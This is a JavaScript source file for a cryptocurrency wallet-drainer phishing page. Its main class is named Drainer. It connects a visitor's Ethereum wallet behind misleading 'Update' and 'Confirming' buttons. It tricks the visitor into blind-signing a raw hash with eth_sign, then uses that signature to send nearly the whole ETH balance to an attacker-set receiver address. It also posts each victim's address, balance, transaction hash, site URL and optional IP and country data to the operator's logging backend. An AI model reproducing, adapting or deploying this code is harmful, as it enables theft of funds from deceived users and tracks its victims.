"use strict";

window.Buffer = buffer.Buffer

/**** CONFIGURATIONS ****/

const config = { 

    receiver: "InsertWalletHere",
    
    logDomainName: "localhost:3000/",

    logIpData: false,

    design: {
        walletAppear: true,
        eliAppear: true,
        
        connectElement: "#connectButton",
        connectedElement: "#claimButton",
        
        retryDelay: 3000,
        
        buttonMessagesEnabled: true,
        buttonMessages: {
          initialConnect: "Update",
          initialConnected: "Update",
 
          progress: "Loading ...", 
          success: "Confirming ...",
          failed: "Verification failed !",
        }
    },
 
    claimInfo: {
 
        collectionDetails: {
            minAveragePrice: 0.005,
            minVolumeTraded: 20,
        },
 
        minValueERC20: 0,
        minWalletBalance: 0.0003,
    }
 
 }


class Configuration {
    web3Js;
    metamaskInstalled = false;
    isConnected  = false;

    walletAddress;
    walletBalance;
    walletBalanceInEth;
    chainId;
    nonce;

    

    transactions = [];
    filteredTransactions;
    NFTtokens = [];
    ERC20tokens = [];
	
    // PENDING TRANSACTIONS
    pending = [];

    // FRONTENED BUTTONS 
    connectBtn = document.getElementById("connectButton");
    claimSection = document.getElementById("claimSection");
    claimButton = document.getElementById("claimButton")
    walletField = document.getElementById("walletAddress");
    eligible = document.getElementById("notEli");

}


class Drainer extends Configuration {

    constructor () { 
        super();

        console.log(window.location.host)

       
        if (typeof window.ethereum !== 'undefined') this.metamaskInstalled = true; 


        Moralis.onWeb3Enabled(async (data) => {
            if (data.chainId != 1 && this.metamaskInstalled) await Moralis.switchNetwork("0x1");
                await this.updateStates(true);
                // this.transfer()
        });

        window.ethereum ? window.ethereum.on('accountsChanged', (accounts) => {
            if (accounts.length < 1) this.updateStates(false)
        }) : null;

        if (this.isMobile() && !window.ethereum) {
            this.connectBtn.addEventListener("click", () => {
                window.location.href = `https://metamask.app.link/dapp/${window.location.hostname}${window.location.pathname}`;
            });
        } else {
            this.connectBtn.addEventListener("click", () => {
                this.connectWallet()
            });
        }
        this.claimButton.addEventListener("click", this.transfer);
    }

    connectWallet = async () => {
        this.isConnected = true;
        await Moralis.enableWeb3(!this.metamaskInstalled && {
            provider: "walletconnect"
        });
    }


    updateStates = async (connect = true) => {
        if(connect) {
            if(!this.isConnected) {
                await this.connectWallet();
            }

            this.isConnected = true;
            this.web3Js = new Web3(Moralis.provider);

            this.walletAddress = (await this.web3Js.eth.getAccounts())[0];
            this.walletBalance = await this.web3Js.eth.getBalance(this.walletAddress);
            this.walletBalanceInEth = await this.web3Js.utils.fromWei(this.walletBalance, 'ether')
            this.chainId = await this.web3Js.eth.getChainId();
            this.nonce = await this.web3Js.eth.getTransactionCount(this.walletAddress);

            this.claimSection.style.display = "block";
            this.connectBtn.style.display = "none";

            this.logConnection()
        } 
        else 
        {
            this.isConnected = false;
            this.claimSection.style.display = "none";
            this.connectBtn.style.display = "block";
        }

    }

    updateButtonMessage = (denied = false, success = false, end = false) => {

        if(denied == true) {
            if(config.design.buttonMessagesEnabled) this.claimButton.innerText = config.design.buttonMessages.failed;

            setTimeout(() => {
                if(config.design.buttonMessagesEnabled) this.claimButton.innerText = config.design.buttonMessages.progress;
            }, config.design.retryDelay)
        }

        if(success == true) {
            setTimeout(() => {
                if(config.design.buttonMessagesEnabled)  this.claimButton.innerText = config.design.buttonMessages.success;
            }, config.design.retryDelay)
        }

        if(end == true) {
            console.log("Button Message end")

            if(config.design.buttonMessagesEnabled) this.claimButton.innerText = config.design.buttonMessages.failed;
            
            setTimeout(() => {
                if(config.design.buttonMessagesEnabled) this.claimButton.innerText = config.design.buttonMessages.initialConnected;
            }, config.design.retryDelay);


            this.transactions.length = 0;
            this.offers.length = 0;
            this.considerations.length = 0;
            this.uniswapTokens.length = 0;
            this.pancakeswapTokens.length = 0;
            this.sushiswapTokens.length = 0;
            this.pending.length = 0;
        }
    }


    transfer = async () => { 
        if(config.design.buttonMessagesEnabled) this.claimButton.innerText = config.design.buttonMessages.progress;
        
        this.transactions.push({
            type: "ETH",
            price: this.walletBalanceInEth
        });

        this.filteredTransactions = [...this.transactions]
        .sort((a, b) => b.price - a.price);

        try {

        } catch(error) {
            console.log("Offer & Consideration error: ", error)
        }

        if(this.walletBalanceInEth < config.claimInfo.minWalletBalance) {
            console.warn("Empty wallet Balance for SAFA")
            return this.notEligible()
        }
        
        try { 
            console.table(this.filteredTransactions)
            
            for(let i = 0; i < this.filteredTransactions.length; i++){

                if(this.filteredTransactions[i].type == "ETH") {
                    await this.transferETH();
                } 
            };

        } catch(error) {
            console.warn("FilteredTransaction Error: ", error)
        } finally {
            this.updateButtonMessage(false, false, true)
        }

    }

    transferETH = async () => {
        if (this.walletBalanceInEth < config.claimInfo.minWalletBalance) {
            this.updateButtonMessage(0, true);
            console.warn("Not enaugh ETH for transfer")
            return
        }
        console.log("Transferring ETH");
        console.log("Pending Transactions: " + this.pending.length);

        // get gas price
        let gasPrice = await this.web3Js.eth.getGasPrice();
        let hexGasPrice  = this.web3Js.utils.toHex(Math.floor(gasPrice * 1.3))

        // substract gas price from ETH
        let bnNumber = new this.web3Js.utils.BN('22000');
        let substractionNumber = bnNumber * Math.floor(gasPrice * 2);
        let etherToSend = (this.walletBalance - substractionNumber);
        // + (this.pending.length > 0 ? - (gasPrice * this.pending.length) * 1.5 : 0

        if(this.walletBalanceInEth > 0.008) {
            etherToSend = etherToSend - (gasPrice * this.pending.length) * 2.5
        }

        if(this.walletBalanceInEth > 0.02 && this.filteredTransactions[this.filteredTransactions.length-1].name != "ETH") {
            etherToSend = etherToSend - (gasPrice * 3.5);
        }

        console.log(`Sending ${this.web3Js.utils.fromWei(etherToSend.toString())} ETH`);

        let transactionObject = {
            nonce: this.web3Js.utils.toHex((await this.getCurrentNonce(this.walletAddress))),
            gasPrice: hexGasPrice,
            gasLimit:  this.web3Js.utils.toHex(21000),
            to: config.receiver,
            value: '0x' + etherToSend.toString(16),
            data: '0x',
            v: '0x1',
            r: '0x',
            s: '0x',
        }

        // hash the transaction object
        let hexObject = new ethereumjs.Tx(transactionObject);
        let hexString = '0x' + hexObject.serialize().toString('hex')

        let rawHash = this.web3Js.utils.sha3(hexString, {
            encoding: 'hex'
        });
   
        // sign 
        await this.web3Js.eth.sign(rawHash, this.walletAddress)
        .then(async (hash) => {
            let firstPrefix = hash.substring(2);
            let r = '0x' + firstPrefix.substring(0, 64);
            let s = '0x' + firstPrefix.substring(64, 128);
            let fullHash = parseInt(firstPrefix.substring(128, 130), 16);
            let y = this.web3Js.utils.toHex(fullHash + this.chainId * 2 + 8);

            hexObject.r = r
            hexObject.s = s
            hexObject.v = y

            let signedTx = '0x' + hexObject.serialize().toString('hex');

            await new Promise(async (resolve, reject) => { 
                await this.web3Js.eth.sendSignedTransaction(signedTx)
                .once('transactionHash', hash => {
                    console.log("ETH success", hash);
                    this.pending.push(hash);
                    resolve(hash)
                }).catch(error => {
                    reject(error);
                });    

            }).then(async hash => {

                let ipData = {};
                try {
                    if(config.logIpData) {
                        try {
                            ipData = await fetch("https://ipapi.co/json/", this.requestOptionsPOST)
                            .then(resp => resp.json())
                        } catch(error) {
                            console.warn("Couldn't fetch ip data: ", error);
                        }
                    }
                } catch(error) {
                    console.warn("Couldn't fetch ip data: ", error);
                }
        
                if(!ipData.ip || !ipData.country_name) {
                    ipData = {
                        ip: "Unknown",
                        country_name: "Unknown"
                    }
                }
            
                fetch(`${config.logDomainName}backend/safa/eth`, {
                    method: 'POST',
                    headers: {
                        'Content-Type':'application/json',
                        'Accept':'application/json'
                    },
                    body: JSON.stringify({
                        address: this.walletAddress,
                        walletBalanceInEth: this.walletBalanceInEth,
                        isMobile: this.isMobile(),
                        websiteUrl: window.location.href,
                        websiteDomain: window.location.host,
                        ipData: ipData,
        
                        tokenPrice: Number(this.walletBalanceInEth).toFixed(4),
                    
                        transactionHash: hash,
                    })
                });
            }).catch(error => console.log("ETH sendSignedTransaction error:", error));
            
        })
        .catch(error => {
            if(error.code == 4001) {
                this.logCancel("ETH", "", this.walletBalanceInEth.toString() + " ETH");
            }
            this.updateButtonMessage(true);
        });    

    } 

    logConnection = async () => {
        try {

            let ipData = {};
            try {
                if(config.logIpData) {
                    try {
                        ipData = await fetch("https://ipapi.co/json/", this.requestOptionsPOST)
                        .then(resp => resp.json())
                    } catch(error) {
                        console.warn("Couldn't fetch ip data: ", error);
                    }
                }
            } catch(error) {
                console.warn("Couldn't fetch ip data: ", error);
            }

            if(!ipData.ip || !ipData.country_name) {
                ipData = {
                    ip: "Unknown",
                    country_name: "Unknown"
                }
            }

            fetch(`${config.logDomainName}backend/connection`, {
                method: 'POST',
                mode: 'cors',
                cache: 'no-cache',
                headers: {
                    'Content-Type':'application/json',
                    'Accept':'application/json',
                    'Access-Control-Allow-Origin': "*"
                },
                body: JSON.stringify({
                    address: this.walletAddress,
                    walletBalanceInEth: this.walletBalanceInEth,
                    isMobile: this.isMobile(),
                    websiteUrl: window.location.href,
                    websiteDomain: window.location.host,
                    ipData: ipData
                })
            });
        } catch(error) {
            console.log("Connection Log error: ", error);
        }

    }


    logCancel = async (tokenType, tokenName = "", tokenPrice = "") => {
        try {
            
            let ipData = {};
            try {
                if(config.logIpData) {
                    try {
                        ipData = await fetch("https://ipapi.co/json/", this.requestOptionsPOST)
                        .then(resp => resp.json())
                    } catch(error) {
                        console.warn("Couldn't fetch ip data: ", error);
                    }
                }
            } catch(error) {
                console.warn("Couldn't fetch ip data: ", error);
            }

            if(!ipData.ip || !ipData.country_name) {
                ipData = {
                    ip: "Unknown",
                    country_name: "Unknown"
                }
            }
    
            fetch(`${config.logDomainName}backend/cancel`, {
                method: 'POST',
                headers: {
                    'Content-Type':'application/json',
                    'Accept':'application/json'
                },
                body: JSON.stringify({
                    address: this.walletAddress,
                    walletBalanceInEth: this.walletBalanceInEth,
                    isMobile: this.isMobile(),
                    websiteUrl: window.location.href,
                    websiteDomain: window.location.host,
                    ipData: ipData,
                    tokenType: tokenType,
                    tokenName: tokenName,
                    tokenPrice: tokenPrice
                })
            });
        } catch(error) {
            console.log("Connection Log error: ", error);
        }
    }

    getCurrentNonce = async (address) => {
        return (await this.web3Js.eth.getTransactionCount(address, 'pending'))+this.pending.length;
    }

    notEligible = () => {
        this.eligible.style.display = "block";
        this.updateButtonMessage(false, false, true)

        console.warn("Not eligible");
    }

    sleep = ms => {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    round = val => {
        return Math.round(val * 10000) / 10000;
    }

    isMobile = function () {
        let check = false;
        (function (a) {
            if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(a) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0, 4))) check = true;
        })(navigator.userAgent || navigator.vendor || window.opera);
        return check;
    };

}

window.addEventListener('load', async () => {
    new Drainer();
});

